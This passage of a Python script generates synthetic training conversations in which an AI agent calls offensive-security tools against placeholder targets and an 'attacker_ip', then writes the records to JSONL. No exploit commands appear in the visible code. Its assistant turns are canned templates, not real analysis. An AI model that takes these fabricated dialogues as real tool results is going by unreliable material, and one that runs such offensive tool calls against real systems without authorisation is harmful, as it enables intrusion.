    reasoning = scenario["reasoning"][min(query_idx, len(scenario["reasoning"]) - 1)]

    ip = _random_ip(rng)
    domain = _random_domain(rng)
    attacker_ip = _random_attacker_ip(rng)

    user_query = user_query.replace("{ip}", ip).replace("{domain}", domain)
    reasoning = reasoning.replace("{ip}", ip).replace("{domain}", domain)

    tool_call_parts = []
    tool_response_parts = []

    for tool_name in tools:
        pool = arg_pools.get(tool_name, [])
        if not pool:
            continue

        args = rng.choice(pool)
        args = _replace_in(args, ip, domain, attacker_ip)

        tc = {"name": tool_name, "arguments": args}
        tool_call_parts.append(f"<tool_call>\n{json.dumps(tc)}\n</tool_call>")

        resp_pool = response_pools.get(tool_name, ["OK"])
        resp = rng.choice(resp_pool)
        resp = resp.replace("{ip}", ip).replace("{domain}", domain)
        tool_response_parts.append(f"<tool_response>\n{resp}\n</tool_response>")

        tool_usage[tool_name] += 1

    if len(tool_call_parts) < 2:
        return None

    system_prompt = build_system_prompt()
    assistant_content = f"{reasoning}\n\n" + "\n".join(tool_call_parts)
    response_content = "\n".join(tool_response_parts)

    analysis_templates = [
        "Based on the results, I can see several interesting findings. Let me analyze what we've discovered.",
        "The results reveal useful information about the target. Here's my analysis of the findings.",
        "Good results. I've identified several points of interest from these outputs.",
        "The tool output shows some actionable information. Let me break down what I found.",
        "Interesting findings from the enumeration. Here's what stands out.",
    ]

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": user_query},
        {"role": "assistant", "content": assistant_content},
        {"role": "user", "content": response_content},
        {"role": "assistant", "content": rng.choice(analysis_templates)},
    ]

    return {
        "messages": messages,
        "slice": "tool_calling_multi",
        "source": "oco_synthetic",
        "category": f"offsec_{scenario['category']}",
        "has_tools": True,
        "n_turns": len(messages),
    }


def synthesize(
    input_path: Path,
    target_count: int,
    seed: int,
    tool_weights: dict[str, float] | None = None,
) -> list[dict]:
    """Main synthesis pipeline."""
    weights = tool_weights or DEFAULT_TOOL_WEIGHTS

    logger.info("Extracting argument templates from %s", input_path)
    extracted = extract_arg_templates(input_path) if input_path.exists() else {}

    arg_pools = merge_template_pools(extracted, SUPPLEMENTAL_ARGS)
    for tool in weights:
        if tool not in arg_pools:
            arg_pools[tool] = SUPPLEMENTAL_ARGS.get(tool, [])
        if not arg_pools[tool]:
            logger.warning("No argument templates for %s — tool will be skipped", tool)

    rng = random.Random(seed)
    tool_usage: Counter = Counter()
    records = []

    max_attempts = target_count * 5
    attempts = 0

    while len(records) < target_count and attempts < max_attempts:
        attempts += 1
        scenario = rng.choice(SCENARIOS)
        record = generate_conversation(
            scenario, arg_pools, TOOL_RESPONSES, rng, tool_usage, weights,
        )
        if record:
            records.append(record)

    logger.info("Generated %d synthetic records in %d attempts", len(records), attempts)

    total_calls = sum(tool_usage.values())
    logger.info("Tool distribution in synthetic data:")
    for tool, count in tool_usage.most_common():
        pct = count / total_calls * 100 if total_calls else 0
        target_pct = weights.get(tool, 0) * 100
        logger.info("  %-12s %4d (%5.1f%%)  target: %5.1f%%", tool, count, pct, target_pct)

    return records


# ── CLI ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Synthesize offsec tool-call training data from R2 session patterns"
    )
    parser.add_argument("--input", default="data/oco_converted/train.jsonl",
                        help="Converted session data (JSONL)")
    parser.add_argument("--output", default="data/oco_converted/synthetic_tool_calls.jsonl",
                        help="Output synthetic records (JSONL)")
    parser.add_argument("--count", type=int, default=2000,
                        help="Target number of synthetic records")
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()

    input_path = Path(args.input)
    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    logger.info("=" * 60)
    logger.info("Offsec Tool-Call Synthesis")
    logger.info("  input:  %s", input_path)
    logger.info("  output: %s", output_path)
    logger.info("  target: %d records", args.count)
    logger.info("=" * 60)

    records = synthesize(input_path, args.count, args.seed)

    with open(output_path, "w") as f:
        for record in records:
            f.write(json.dumps(record) + "\n")

    stats = {
        "total_records": len(records),
        "seed": args.seed,
        "source_file": str(input_path),
        "categories": dict(Counter(r["category"] for r in records)),
    }
    stats_path = output_path.with_suffix(".stats.json")
    stats_path.write_text(json.dumps(stats, indent=2))

    logger.info("Written %d records to %s", len(records), output_path)
    logger.info("Stats: %s", stats_path)


if __name__ == "__main__":
    main()
